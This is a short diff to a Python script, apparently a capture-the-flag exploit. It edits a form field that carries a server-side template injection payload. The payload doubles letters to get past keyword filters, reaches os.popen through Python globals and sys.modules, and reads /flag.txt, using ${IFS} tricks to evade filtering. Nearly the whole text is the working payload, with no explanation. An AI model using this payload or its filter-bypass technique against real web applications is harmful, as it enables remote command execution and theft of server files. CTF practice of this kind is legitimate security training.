@@ -7,7 +7,7 @@ data = {
     "username": "test",
     "age": "test",
     "sexe": "test",
-    "picture": "{ {{ {seselflf.__init__.__globals__. sys. modules. ooss. popen('cat${IFS}/flag.${x}txt'). read()} }} }",
+    "picture": "{ {seselflf.__init__.__globals__. sys. modules. ooss. popen('cat${IFS}/flag.${x}txt'). read()} }",
     "description": "test"
 }
 
